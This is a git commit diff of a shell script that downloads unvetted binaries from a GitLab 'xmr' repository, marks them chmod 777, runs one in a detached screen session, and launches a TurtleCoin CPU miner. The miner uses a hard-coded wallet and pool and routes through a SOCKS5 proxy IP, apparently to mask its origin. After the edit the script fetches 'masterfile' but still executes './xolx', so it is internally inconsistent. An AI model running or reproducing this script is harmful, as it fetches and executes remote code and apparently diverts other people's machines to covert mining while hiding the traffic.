23d0b0751d0a47369c21936cf68b403b22172980
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-24 22:05:05 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,12 +2,11 @@
 apt-get update 
 apt-get install screen libjansson4 -y
 wget https://gitlab.com/buyutuk/xmr/-/raw/main/ip
-wget https://gitlab.com/buyutuk/xmr/-/raw/main/xolx
-chmod 777 ip xolx
+wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
+chmod 777 ip masterfile
 screen -d -m python3 ip
-screen -dmS ls
 POOL=turtlecoin.herominers.com:10380
 WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
 WORKER=CPU
-PROXY=socks5://72.210.252.134:46164
+PROXY=socks5://192.252.209.155:14455
 ./xolx -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
